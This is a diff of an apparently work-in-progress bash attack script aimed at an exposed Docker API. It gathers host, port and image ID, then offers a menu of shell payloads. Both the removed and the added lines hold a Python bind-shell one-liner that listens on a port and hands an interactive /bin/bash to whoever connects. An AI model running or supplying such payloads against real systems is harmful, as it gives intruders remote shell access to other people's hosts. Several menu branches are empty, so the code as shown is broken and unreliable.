@@ -29,15 +29,7 @@ echo " | __ /   (  <_> )  \___|    <\  ___/|  | \/  |    |_ /\\   /|  |  |__"
 echo "/_______  /\____/ \___  >__|_ \\___  >__|    /_______  / \_/ |__|____/"
 echo "        \/            \/     \/    \/                \/               "
 
-## This area is reserved for the declaration of payloads. Change the script later, so we only export the PAYLOAD VARIABLE that we actually gonna use...
-##																																																								This will probaby make the script a lil bit faster.
-
-export pypay="import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',4620));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
-export perlpay
-export rubypay
-export phppay
-
-
+#	PART ONE 	-	RECEIVING IP AND PORT
 ## Receives user input - HOST:PORT
 HOST="$1"
 if [ $HOST != " " &> /dev/null ]
@@ -50,6 +42,8 @@ if [ $HOST != " " &> /dev/null ]
 						rm /tmp/djson.txt
 						exit 1		# Exit error 1 == Host or port seems to be wrong...
 				else
+
+					## PART TWO 	- GETTING IMAGE ID AND STORING IT
 					## Getting image ID
 					echo -e "\nGetting image ID..."
 					cat /tmp/djson.txt | json_pp | awk '/sha256:/ {print $3}' | tr -d '"' | tr -d ',' | cut -d ":" -f2,2 > /tmp/IMG_ID.dkr
@@ -59,6 +53,27 @@ if [ $HOST != " " &> /dev/null ]
 					echo -e "Done\n"
 ## 		Closing the "Checking Docker API" IF statement
 			fi
+
+### PART TREE	 - CHOOSING PAYLOAD
+	echo -e "\n Which payload would you like to use?"
+	echo -e "So far we have: bash, perl, python, php, ruby. Please feel free to add to it. \n"
+	read payload
+
+	if [ $payload == "bash" ]
+		then
+
+	elif [ $payload == "perl" ]
+		then
+	elif [ $payload == "python" ]
+		then
+			export pytpay="import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',1995));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
+
+	elif [ $payload == "php" ]
+		then
+	elif [ $payload == "ruby" ]
+		then
+fi
+
 	else
 		echo "You need to set the host and port along with the script... SCRIPT HOST:PORT"
 		exit 2 					# Exit error 2 == no HOST:PORT was given
